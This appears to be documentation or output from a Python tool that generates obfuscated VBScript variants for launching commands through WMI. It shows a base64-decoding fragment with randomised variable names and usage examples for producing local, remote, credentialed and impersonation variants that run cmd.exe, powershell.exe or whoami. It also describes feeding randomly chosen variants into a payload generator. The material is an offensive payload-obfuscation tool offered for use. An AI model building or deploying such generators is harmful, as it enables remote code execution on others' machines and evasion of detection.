[REMOTE-3] ENCODED_REMOTE
Description: Remote connection with base64 encoded command
Type: remote_obfuscated
--------------------------------------------------------------------------------
Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function

Dim objLoc_XlEPcPkm, objConn_PZSQDGtB, objSvc_lcXXERqj, objProc_DUrjHiip, encCmd_zhxeULXb

Set objLoc_XlEPcPkm = CreateObject("WbemScripting.SWbemLocator")

================================================================================
USAGE EXAMPLES
================================================================================


Python Usage:
=============

# Import the generator
from wmi_locator_variants import WMILocatorVariantGenerator

# Create instance
gen = WMILocatorVariantGenerator()

# Generate single variant
code = gen.generate_local_dot_connection("calc.exe")
print(code)

# Generate all variants
variants = gen.generate_all_variants("whoami")
for variant_id, info in variants.items():
    print(f"{variant_id}: {info['code']}")

# Generate specific variant types
code = gen.generate_authenticated_connection("cmd.exe", "192.168.1.100", "admin", "pass")
code = gen.generate_impersonation_connection("powershell.exe")
code = gen.generate_wdm_namespace_connection("tasklist")

Integration with Existing Code:
===============================

# Add to payload generator
from wmi_locator_variants import WMILocatorVariantGenerator
gen = WMILocatorVariantGenerator()

selected = random.choice(list(all_variants.values()))
payload = selected["code"]

=======================

# Get only local variants
variants = gen.generate_all_variants("cmd.exe")

# Get only remote variants
remote_only = {k: v for k, v in variants.items() if "remote" in v["type"]}
